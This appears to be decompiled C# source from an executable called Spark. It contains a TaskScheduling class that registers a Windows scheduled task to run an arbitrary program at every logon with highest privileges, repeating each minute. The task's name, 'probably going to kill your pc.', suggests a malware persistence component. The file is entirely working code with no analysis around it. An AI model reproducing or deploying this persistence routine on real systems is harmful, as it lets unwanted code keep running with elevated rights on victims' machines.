// Decompiled with JetBrains decompiler
// Type: Spark.TaskScheduling
// Assembly: Spark, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2DFB06E8-4427-4218-A5F6-F5DE139079B1
// Assembly location: C:\Users\adriel\Downloads\Spark\Chris@Spark.exe

using Microsoft.Win32.TaskScheduler;
using System;

#nullable disable
namespace Spark;

internal class TaskScheduling
{
  public static void Schedule(string toSchedule)
  {
    TaskService taskService = new TaskService();
    TaskDefinition taskDefinition = taskService.NewTask();
    taskDefinition.Principal.RunLevel = (TaskRunLevel) 1;
    LogonTrigger logonTrigger = new LogonTrigger();
    ((Trigger) logonTrigger).Repetition.Interval = TimeSpan.FromMinutes(1.0);
    taskDefinition.Triggers.Add<LogonTrigger>(logonTrigger);
    taskDefinition.Actions.Add<ExecAction>(new ExecAction(toSchedule, (string) null, (string) null));
    taskService.RootFolder.RegisterTaskDefinition("probably going to kill your pc.", taskDefinition);
  }
}
